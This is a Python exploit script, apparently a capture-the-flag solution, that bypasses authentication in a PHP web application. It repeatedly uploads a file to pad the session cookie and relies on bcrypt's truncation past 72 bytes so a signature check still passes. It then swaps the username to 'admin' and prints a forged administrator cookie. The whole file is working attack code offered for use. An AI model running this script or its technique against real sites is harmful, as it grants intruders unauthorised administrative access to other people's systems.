"""
Coded by d4rkstat1c
"""
from sys import argv
import requests
from base64 import b64decode, b64encode
import json
from urllib import parse

def get_args():
	if len(argv) != 3:
		print('Usage: ', argv[0], 'http://ip:port <file>')
		exit(1)
	return argv[1], argv[2]

def decode_cookie(cookie):
	json_data, key = parse.unquote(cookie).split('.', 1)
	data = json.loads(b64decode(json_data))
	return data, key

def encode_cookie(data, key):
	json_data = json.dumps(data)
	formatted_data = json_data.replace(' ', '').replace("'", '"')
	b64_data = b64encode(formatted_data.encode())
	data_str = '.'.join([b64_data.decode(), key])
	encoded_data = data_str
	return encoded_data

def fill_cookie(s, target, file):
	"""
	Fill the cookie with just enough data to exploit the password_hash/password verify
	functions.
	"""
	for i in range(3):
		with open(file, 'rb') as f:
			files = {'uploadFile': (file, f, 'image/png')}
			r = s.post(target+'/upload', files=files)
		if r.status_code == 200:
			print('File uploaded successfuly', r.status_code)
		data, key = decode_cookie(s.cookies['PHPSESSID'])
		print(data)
	return s, data, key

def auth_bypass(s, target, data, key):
	"""
	Now anything past 71 bytes will be truncated and valid data within the cookie.
	"""
	data['username'] = 'admin'
	encoded_cookie = encode_cookie(data, key)
	s.cookies.set('PHPSESSID', encoded_cookie)
	r = s.post(target)
	return r.cookies['PHPSESSID']

def main():
	target, file = get_args()
	s = requests.session()

	s, data, key = fill_cookie(s, target, file)
	admin_cookie = auth_bypass(s, target, data, key)

	print('\n[*] Auth bypass exploited! Admin cookie:')
	print(admin_cookie)

if __name__ == '__main__':
	main()
